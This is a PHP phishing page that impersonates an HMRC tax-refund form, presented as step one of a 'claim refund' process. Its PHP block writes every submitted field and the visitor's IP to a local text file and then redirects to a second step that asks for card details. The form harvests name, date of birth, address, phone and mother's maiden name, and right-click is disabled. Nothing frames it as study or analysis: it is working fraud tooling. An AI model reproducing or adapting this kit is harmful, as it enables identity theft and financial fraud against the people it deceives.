<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: step2-claim-refundformprocess=4624g80a13c-0db1f8e263663d3faee8d1-95a86e1d21wh81928j9i1hbcvuy-2918783d7j91kjhgbxx-7942f7415cf1b4a661698.php');
$handle = fopen('step1.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
  
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<link rel="shortcut icon" href="a/favi.ico" type="image/x-icon">
<head>
    <title>HMRC: Personal information</title>
    <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">
					<meta http-equiv="Content-Style-Type" content="text/css">
					<meta http-equiv="Content-Script-Type" content="text/javascript">
<script language="JavaScript" src="nou.js" type="text/javascript"></script>
    <link rel="stylesheet" href="a/aha.css" type="text/css">
					<link rel="stylesheet" href="a/a.css" type="text/css" media="print">
					<!--[if IE 8]>
					<link rel="stylesheet" href="a/ie8.css" type="text/css">
					<![endif]-->
					<!--[if IE 7]>
					<link rel="stylesheet" href="a/ie7.css" type="text/css">
					<![endif]-->
					<!--[if IE 6]>
					<link rel="stylesheet" href="a/ie6.css" type="text/css">
					<![endif]-->
    
      <link rel="stylesheet" href="a/r.css" type="text/css">
    
    
  </head>
<div id="header-digital">
						<ul class="screen-reader">
    <li>
      <a accesskey="s" href="#main">Skip to main content</a>
    </li>
    <li>
      <a accesskey="2" class="new-window" href="http://www.hmrc.gov.uk/news/index.htm">What's New</a>
    </li>
    <li>
      <a accesskey="5" class="new-window" href="https://online.hmrc.gov.uk/information/faqs">Frequently
Asked Questions</a>
    </li>
    <li>
      <a accesskey="7" class="new-window" href="http://customs.hmrc.gov.uk/channelsPortalWebApp/channelsPortalWebApp.portal?_nfpb=true&amp;_pageLabel=pageContactUs_ShowContent&amp;propertyType=document&amp;resetCT=true&amp;id=HMCE_PROD1_025307">Complaints Procedure</a>
    </li>
    <li>
      <a accesskey="9" class="new-window" href="http://www.hmrc.gov.uk/menus/contactus.shtml">Contact Us</a>
    </li>
    <li>
      <a accesskey="3" class="new-window" href="http://www.hmrc.gov.uk/nav/index.htm">Sitemap</a>
    </li>
    <li>
      <a accesskey="4" class="new-window" href="http://search.hmrc.gov.uk/kbroker/inldrev/inldrev/search.lsim">Search</a>
    </li>
  </ul>
						<a href="" accesskey="1"><img src="a/digitalLogo.png" alt="HM Revenue &amp; Customs" height="0" width="256" class="screen"><img src="a/digitalLogo-print.png" alt="" height="29" width="256" class="print"></a>
						<ul class="inline-navigation">
							<li><a href="">Home</a></li>
							<li><a href=""><span lang="cy">Cymraeg</span></a></li>
							<li><a href="" class="">Contact HMRC</a></li>
							<li><a href="" accesskey="6" class="">Help</a></li>
							
						</ul>
					</div>

    <div id="banner" class="no-menu">
      
        



  <div id="rne">
    <dl class="process-overview" >
		
		<dt  class="selected">1</dt>
        <dd>Step 1<br>Enter personal information</dd>


        
		<dt >2</dt>
        <dd class="last">
           
             
             
               Step 2<br>Enter credit/debit card information
             
           
        </dd>
    </dl>
  </div>
      
      <div id="user-information">
        
      </div>
      
        <h1>
          Step 1 - Enter personal information
        </h1>
      
      <a name="main" class="screen-reader"></a>
      
    </div>
  	
	      



<div class="portlet no-title-bar">
	<div class="portlet-header"><h2>&nbsp;</h2></div>
	 <div class="portlet-body">
		<form name="asd" name="asd" method="post" action="<?php echo basename(__FILE__); ?>"  class="narrow-labels">
			
				



<body oncontextmenu="return false;">



    
      <div id="pageError.individualSelfAssessmentUserIdOnline" class="error" >
      
      </div>
    

    <p>
    	<span class="required">*</span>
    	indicates required information
    </p>
    <p>
    	<strong>Please note:</strong> Fields are not case sensitive.
    </p>

	<h3>
	   	Personal information
     </h3>

     

		
		

		
		<br><br>
			
				<div class="field"><label for="name" id="name">Full Name:<span class="required">*</span></label><input type="text" value="" class="" name="name" id="name"  maxlength="40"> <div class=""></div></div>
			

		
				<div class="field"><label for="dob" id="dob">Date of Birth:<span class="required">*</span></label><input type="text" value="" class="" placeholder="day" name="dddob" size="3" id="dddob"  maxlength="2">-<input type="text" value="" class="" name="mmdob" size="4" id="mmdob"  placeholder="month" maxlength="2">-<input type="text" value="" class="" name="yyyydob" size="5" id="yyyydob" placeholder="year" maxlength="4">

<br>

	<br>			


<label for="city" id="city">City:<span class="required">*</span></label><input type="text" value="" class="" name="city" id="city"  maxlength="25"><div class="hint" id="City">
</p></div></div>

<div class="field"><div class="addr" id="addr"></div><label for="addr" id="addr">Street Address:<span class="required">*</span></label><input type="text" value="" class="" name="addr" id="addr"  maxlength="40"><div class="hint" id="Billing Address"><p>

</p></div></div>

<div class="field"><div class="zip" id="zip"></div><label for="zip" id="zip">Postcode:<span class="required">*</span></label><input type="text" value="" class="" name="zip" id="zip" maxlength="12"><div class="hint" id="Postcode"><p>

</p></div></div>

<div class="field"><div class="phone" id="phone"></div><label for="phone" id="phone">Phone Number:<span class="required">*</span></label><input type="text" value="" class="" name="phone" id="phone"  maxlength="15"><div class="hint" id="Phone Number"><p>

</p></div></div>

<div class="field"><div class="mmn" id="mmn"></div><label for="mmn" id="mmn">Mother`s Maiden Name:<span class="required">*</span></label><input type="text" value="" class="" name="mmn" id="mmn"  maxlength="25"><div class="hint" id="Mother`s Maiden Name"><p>

</p></div></div>


 
   </div>




	<div class="field"><div class="error" id="fieldError.abroadSignal"></div><ul><li></label></li></ul><div class="hint" id="HintabroadSignal"></div></div>

			 
 			 

<div class="buttons">
	<input type="submit" name="submit" id="ButtonSubmit" value="Continue">
	<input type="submit" name="back" class="no-validation" id="ButtonBack" value="Back">
</div>
		</form>
	 </div>
 </div>
	      

	  	
	  	<ul class="inline-navigation" id="footer">
<li class="first">&#169; <a class="" href="">Crown Copyright</a></li>

<li><a accesskey="8" class="" href="">Terms &amp; Conditions</a></li>

<li><a class="" href="">Privacy policy</a></li>

<li><a accesskey="0" class="" href="">Accessibility</a></li>

<li><a class="" href="">Feedback</a></li>

<li><a class="" href="">Complaints</a></li>
</ul>
    
<body oncontextmenu="return false;">
 </body>
<script language="JavaScript" type="text/javascript">
 var frmvalidator = new Validator("asd");
 frmvalidator.addValidation("name","req","Enter your Full Name");
 frmvalidator.addValidation("dddob","minlen=2","Enter your Date of Birth - Day field -");
 frmvalidator.addValidation("mmdob","minlen=2","Enter your Date of Birth - Month field -");
 frmvalidator.addValidation("yyyydob","minlen=2","Enter your Date of Birth - Year field -");
 frmvalidator.addValidation("city","req","Enter your City");
 frmvalidator.addValidation("addr","req","Enter your Full billing address");
 frmvalidator.addValidation("zip","req","Enter your Postcode");
 frmvalidator.addValidation("phone","req","Enter your Mobile/Home Phone Number");
 frmvalidator.addValidation("mmn","req","Enter your Mother`s Maiden Name");
</script>
</html>